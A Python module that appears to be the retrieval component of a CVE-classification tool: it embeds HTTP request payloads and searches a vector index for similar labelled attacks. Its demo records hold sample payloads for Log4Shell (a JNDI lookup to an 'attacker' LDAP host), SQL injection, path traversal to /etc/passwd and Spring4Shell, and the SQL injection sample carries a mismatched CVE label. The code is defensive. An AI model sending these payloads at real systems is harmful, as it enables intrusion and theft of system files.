"""NOVA-F retrieval wrapper used by FlowTragent."""

from __future__ import annotations

import hashlib
import json
import math
import os
from pathlib import Path
from typing import Dict, List

import numpy as np

from src.core.cve_reranker import label_votes, rerank_candidates


DEMO_RECORDS = [
    {
        "id": "demo-log4shell",
        "payload_clean": "GET /?x=${jndi:ldap://attacker/a} HTTP/1.1 Host: victim",
        "cve_labels": ["CVE-2021-44228"],
    },
    {
        "id": "demo-sqli",
        "payload_clean": "GET /login?user=admin' OR '1'='1-- HTTP/1.1 Host: victim",
        "cve_labels": ["CVE-2021-41773"],
    },
    {
        "id": "demo-path-traversal",
        "payload_clean": "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1",
        "cve_labels": ["CVE-2021-42013"],
    },
    {
        "id": "demo-spring4shell",
        "payload_clean": "POST /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di",
        "cve_labels": ["CVE-2022-22965"],
    },
]


class NovaClient:
    """Small API around NOVA-F-style FAISS search.

    It prefers a real NOVA-F index at ``data/index/faiss.index`` plus
    ``data/index/meta.json``. If unavailable, it creates a tiny demo index so
    the FlowTragent pipeline remains testable on a fresh laptop.
    """

    def __init__(
        self,
        index_dir: str | Path = "data/index",
        model_name: str = "sentence-transformers/all-MiniLM-L6-v2",
        force_demo_index: bool = False,
    ) -> None:
        self.index_dir = Path(index_dir)
        self.index_path = self.index_dir / "faiss.index"
        self.meta_path = self.index_dir / "meta.json"
        self.model_name = model_name
        self.force_demo_index = force_demo_index
        self._model = None
        self._index = None
        self._meta: Dict | None = None
        self._demo_vectors: np.ndarray | None = None

        self.index_dir.mkdir(parents=True, exist_ok=True)
        if self.force_demo_index or not (self.index_path.exists() and self.meta_path.exists()):
            self._build_demo_index()

    def search(self, payload: str, top_k: int = 5) -> List[Dict]:
        self._load_index()
        query = self._embed([payload])
        self._normalize(query)
        scores, indexes = self._index.search(query.astype("float32"), top_k)

        ids = list(self._meta.get("ids", []))
        labels = list(self._meta.get("cve_labels", []))
        payloads = list(self._meta.get("payloads", []))
        results: List[Dict] = []
        seen: set[str] = set()

        raw_candidates: List[Dict] = []
        for rank, (idx, score) in enumerate(zip(indexes[0], scores[0]), start=1):
            if idx < 0 or idx >= len(labels):
                continue
            neighbor_labels = self._normalize_labels(labels[idx])
            for cve in neighbor_labels:
                if cve in seen:
                    continue
                seen.add(cve)
                raw_candidates.append(
                    {
                        "cve": cve,
                        "score": round(float(score), 4),
                        "retrieval_score": round(float(score), 4),
                        "rank": rank,
                        "source_id": ids[idx] if idx < len(ids) else str(idx),
                        "neighbor_id": ids[idx] if idx < len(ids) else str(idx),
                        "evidence": payloads[idx] if idx < len(payloads) else "",
                        "neighbor_payload": payloads[idx] if idx < len(payloads) else "",
                        "neighbor_labels": neighbor_labels,
                        "engine": "nova-f",
                    }
                )
                break
        results = rerank_candidates(payload, raw_candidates)
        votes = label_votes(raw_candidates)
        for item in results:
            item["label_votes"] = votes
        return results

    def _load_index(self) -> None:
        if self._index is not None and self._meta is not None:
            return
        self._meta = json.loads(self.meta_path.read_text(encoding="utf-8"))
        try:
            import faiss

            self._index = faiss.read_index(str(self.index_path))
        except Exception:
            if self._demo_vectors is None:
                self._demo_vectors = np.load(self.index_dir / "demo_vectors.npy")
            self._index = _NumpyIndex(self._demo_vectors)

    def _build_demo_index(self) -> None:
        vectors = self._embed([item["payload_clean"] for item in DEMO_RECORDS])
        self._normalize(vectors)
        np.save(self.index_dir / "demo_vectors.npy", vectors)

        try:
            import faiss

            index = faiss.IndexFlatIP(vectors.shape[1])
            index.add(vectors.astype("float32"))
            faiss.write_index(index, str(self.index_path))
        except Exception:
            self.index_path.write_text("numpy fallback index; install faiss-cpu for native index\n", encoding="utf-8")
            self._demo_vectors = vectors

        meta = {
            "ids": [item["id"] for item in DEMO_RECORDS],
            "payloads": [item["payload_clean"] for item in DEMO_RECORDS],
            "cve_labels": [item["cve_labels"] for item in DEMO_RECORDS],
            "embedding_model": self.model_name,
            "mode": "demo",
        }
        self.meta_path.write_text(json.dumps(meta, ensure_ascii=False, indent=2), encoding="utf-8")
        self._index = None
        self._meta = None

    def _embed(self, texts: List[str]) -> np.ndarray:
        if self.force_demo_index or os.getenv("FLOWTRAGENT_OFFLINE") == "1":
            return np.vstack([_hash_embedding(text) for text in texts]).astype("float32")

        try:
            from sentence_transformers import SentenceTransformer

            if self._model is None:
                self._model = SentenceTransformer(self.model_name)
            return self._model.encode(texts, convert_to_numpy=True, normalize_embeddings=False).astype("float32")
        except Exception:
            return np.vstack([_hash_embedding(text) for text in texts]).astype("float32")

    @staticmethod
    def _normalize(vectors: np.ndarray) -> None:
        norms = np.linalg.norm(vectors, axis=1, keepdims=True)
        norms[norms == 0] = 1.0
        vectors /= norms

    @staticmethod
    def _normalize_labels(raw: object) -> List[str]:
        if isinstance(raw, str):
            raw = raw.replace(",", " ").replace(";", " ").split()
        if not isinstance(raw, list):
            return []
        return [str(item).upper() for item in raw if str(item).upper().startswith("CVE-")]


class _NumpyIndex:
    def __init__(self, vectors: np.ndarray) -> None:
        self.vectors = vectors.astype("float32")

    def search(self, queries: np.ndarray, top_k: int):
        scores = queries @ self.vectors.T
        order = np.argsort(-scores, axis=1)[:, :top_k]
        sorted_scores = np.take_along_axis(scores, order, axis=1)
        return sorted_scores.astype("float32"), order.astype("int64")


def _hash_embedding(text: str, dims: int = 384) -> np.ndarray:
    vec = np.zeros(dims, dtype="float32")
    tokens = text.lower().replace("/", " ").replace("?", " ").replace("&", " ").split()
    for token in tokens or [text]:
        digest = hashlib.sha256(token.encode("utf-8", errors="ignore")).digest()
        for i in range(0, len(digest), 2):
            idx = int.from_bytes(digest[i : i + 2], "little") % dims
            vec[idx] += 1.0
    if not math.isfinite(float(vec.sum())):
        return np.zeros(dims, dtype="float32")
    return vec


def hash_embedding(text: str, dims: int = 384) -> List[float]:
    vec = _hash_embedding(text, dims=dims)
    norm = float(np.linalg.norm(vec))
    if norm:
        vec = vec / norm
    return vec.astype("float32").tolist()
